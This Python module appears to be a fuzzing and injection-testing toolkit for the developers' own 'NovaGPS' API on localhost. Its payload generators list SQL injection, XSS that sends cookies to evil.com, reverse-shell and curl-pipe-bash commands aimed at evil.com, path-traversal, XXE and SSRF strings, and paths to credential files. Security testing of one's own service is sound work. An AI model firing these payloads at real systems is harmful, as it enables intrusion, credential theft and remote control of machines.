"""Self-fuzzing and adversarial testing module for NOVA-CORE."""

import json
import random
import time
from typing import Optional

from ..tools import Tool, ToolResult, ToolRegistry


class APIFuzzer(Tool):
    name = "api_fuzzer"
    description = "Fuzz NovaGPS API endpoints with malformed, boundary, and adversarial inputs."
    category = "fuzzer"

    def execute(self, base_url: str = "http://127.0.0.1:8000", rounds: int = 20, **kwargs) -> ToolResult:
        import httpx

        endpoints = [
            ("POST", "/auth/login", {"email": "__FUZZ__", "password": "__FUZZ__"}),
            ("GET", "/devices", None),
            ("POST", "/update-location", {"identifier": "__FUZZ__", "lat": "__FUZZ__", "lon": "__FUZZ__"}),
            ("POST", "/consent", {"identifier": "__FUZZ__", "scope": "__FUZZ__", "granted": True}),
            ("GET", "/geofences", None),
            ("POST", "/tool/run", {"command_id": "__FUZZ__", "target": "__FUZZ__"}),
        ]

        results = []
        crashes = 0
        unexpected = 0

        for _ in range(rounds):
            method, path, body = random.choice(endpoints)
            url = f"{base_url}{path}"

            fuzz_body = self._fuzz_payload(body) if body else None

            try:
                if method == "GET":
                    resp = httpx.get(url, timeout=5)
                else:
                    resp = httpx.post(url, json=fuzz_body, timeout=5)

                if resp.status_code >= 500:
                    crashes += 1
                    results.append({
                        "method": method, "path": path,
                        "status": resp.status_code,
                        "body": fuzz_body,
                        "response": resp.text[:200],
                    })
                elif resp.status_code not in (200, 201, 400, 401, 403, 404, 405, 422):
                    unexpected += 1
                    results.append({
                        "method": method, "path": path,
                        "status": resp.status_code,
                        "body": fuzz_body,
                    })
            except httpx.ConnectError:
                pass
            except Exception as e:
                results.append({"error": str(e), "path": path})

        return ToolResult(
            success=True,
            output={
                "rounds": rounds,
                "server_errors": crashes,
                "unexpected_responses": unexpected,
                "details": results[:50],
                "health": "critical" if crashes > 0 else "warning" if unexpected > 0 else "healthy",
            },
        )

    def _fuzz_payload(self, body: dict) -> dict:
        fuzzed = {}
        for key, value in body.items():
            fuzz_type = random.choice(["null", "empty", "huge", "special", "sql", "xss", "type_confusion"])
            if fuzz_type == "null":
                fuzzed[key] = None
            elif fuzz_type == "empty":
                fuzzed[key] = ""
            elif fuzz_type == "huge":
                fuzzed[key] = "A" * random.randint(10000, 100000)
            elif fuzz_type == "special":
                fuzzed[key] = "!@#$%^&*()[]{}|\\;:'\",.<>?/`~"
            elif fuzz_type == "sql":
                fuzzed[key] = "' OR '1'='1' -- "
            elif fuzz_type == "xss":
                fuzzed[key] = "<script>alert('xss')</script>"
            elif fuzz_type == "type_confusion":
                fuzzed[key] = [1, 2, 3] if isinstance(value, str) else "not_a_number"
            else:
                fuzzed[key] = value
        return fuzzed


class InjectionTester(Tool):
    name = "injection_test"
    description = "Test for SQL injection, XSS, and command injection across API endpoints."
    category = "fuzzer"

    def execute(self, base_url: str = "http://127.0.0.1:8000", **kwargs) -> ToolResult:
        import httpx

        payloads = {
            "sql_injection": [
                "' OR '1'='1",
                "'; DROP TABLE users;--",
                "1' UNION SELECT * FROM users--",
                "admin'--",
                "' OR 1=1 LIMIT 1--",
            ],
            "xss": [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
            ],
            "command_injection": [
                "; ls /etc/passwd",
                "| cat /etc/shadows",
                "$(whoami)",
                "`id`",
                "'; echo vulnerable; '",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ],
        }

        findings = []
        endpoints = [
            ("POST", "/auth/login", {"email": "__PAYLOAD__", "password": "test"}),
            ("GET", "/search?q=__PAYLOAD__", None),
            ("POST", "/tool/run?command_id=__PAYLOAD__&target=__PAYLOAD__", {}),
        ]

        for attack_type, attack_payloads in payloads.items():
            for payload in attack_payloads[:3]:
                for method, path, body in endpoints:
                    url = f"{base_url}{path.replace('__PAYLOAD__', payload)}"
                    req_body = {k: v.replace("__PAYLOAD__", payload) for k, v in body.items()} if body else None

                    try:
                        if method == "GET":
                            resp = httpx.get(url, timeout=5)
                        else:
                            resp = httpx.post(url, json=req_body, timeout=5)

                        resp_text = resp.text.lower()
                        indicators = {
                            "sql_injection": ["sql", "syntax", "mysql", "sqlite", "postgres", "column", "table"],
                            "xss": ["<script", "onerror=", "onload=", "alert("],
                            "command_injection": ["root:", "uid=", "www-data", "bash", "sh"],
                            "path_traversal": ["root:", "bin/bash", "[boot loader]"],
                        }

                        for indicator in indicators.get(attack_type, []):
                            if indicator in resp_text:
                                findings.append({
                                    "attack": attack_type,
                                    "payload": payload[:100],
                                    "endpoint": f"{method} {path.split('?')[0]}",
                                    "indicator": indicator,
                                    "status": resp.status_code,
                                    "severity": "critical" if attack_type in ("sql_injection", "command_injection") else "high",
                                })
                                break
                    except Exception:
                        pass

        return ToolResult(
            success=True,
            output={
                "findings": findings,
                "finding_count": len(findings),
                "risk_level": "critical" if any(f["severity"] == "critical" for f in findings) else
                             "high" if findings else "low",
            },
        )


class PayloadGenerator(Tool):
    name = "payload_gen"
    description = "Generate adversarial test payloads for a given attack category."
    category = "fuzzer"

    def execute(self, category: str = "sqli", count: int = 10, **kwargs) -> ToolResult:
        generators = {
            "sqli": self._gen_sqli,
            "xss": self._gen_xss,
            "cmdi": self._gen_cmdi,
            "path_traversal": self._gen_path_traversal,
            "xxe": self._gen_xxe,
            "ssrf": self._gen_ssrf,
            "lfi": self._gen_lfi,
            "overflow": self._gen_overflow,
        }

        gen = generators.get(category)
        if not gen:
            return ToolResult(
                success=False,
                output=None,
                error=f"Unknown category. Available: {list(generators.keys())}",
            )

        payloads = [gen() for _ in range(count)]

        return ToolResult(
            success=True,
            output={"category": category, "payloads": payloads, "count": len(payloads)},
        )

    def _gen_sqli(self) -> str:
        templates = [
            "' OR '1'='1' --",
            "'; EXEC xp_cmdshell('whoami'); --",
            "1' UNION SELECT NULL,NULL,NULL,NULL--",
            "' WAITFOR DELAY '0:0:5'--",
            "admin'/**/OR/**/1=1--",
            "1; SELECT * FROM information_schema.tables--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            f"' OR '{random.randint(1,999)}'='{random.randint(1,999)}",
            "1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--",
            "'; DECLARE @x VARCHAR(100); SET @x='cmd'; EXEC(@x);--",
        ]
        return random.choice(templates)

    def _gen_xss(self) -> str:
        templates = [
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<img src=x onerror='fetch(\"http://evil.com/\"+document.cookie)'>",
            "<svg/onload=alert(String.fromCharCode(88,83,83))>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "javascript:alert('XSS')//",
            "<a href=javascript:alert('XSS')>click</a>",
            "'-alert(1)-'",
        ]
        return random.choice(templates)

    def _gen_cmdi(self) -> str:
        templates = [
            "; cat /etc/passwd",
            "| curl http://evil.com/shell.sh | bash",
            "$(whoami)`id`",
            "'; echo vulnerable; '",
            "|| nc -e /bin/bash evil.com 4444",
            "`wget http://evil.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m`",
            "; python3 -c 'import os;os.system(\"ls\")'",
            "${IFS}cat${IFS}/etc/passwd",
            "127.0.0.1; ls -la /",
            ";bash -i >& /dev/tcp/evil.com/4444 0>&1",
        ]
        return random.choice(templates)

    def _gen_path_traversal(self) -> str:
        templates = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "..%00/..%00/..%00/etc/passwd",
            "/var/log/../../../../etc/passwd",
            r"....\/....\/....\/etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ]
        return random.choice(templates)

    def _gen_xxe(self) -> str:
        return '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

    def _gen_ssrf(self) -> str:
        return random.choice([
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:6379/",
            "http://localhost:22/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:25/",
            "dict://127.0.0.1:6379/",
        ])

    def _gen_lfi(self) -> str:
        return random.choice([
            "/etc/passwd",
            "/proc/self/environ",
            "/var/log/auth.log",
            "/proc/net/tcp",
            "/etc/shadow",
        ])

    def _gen_overflow(self) -> str:
        return "A" * random.choice([256, 512, 1024, 4096, 65536])


def register_fuzzer_tools(registry: ToolRegistry):
    for tool_cls in [APIFuzzer, InjectionTester, PayloadGenerator]:
        registry.register(tool_cls())
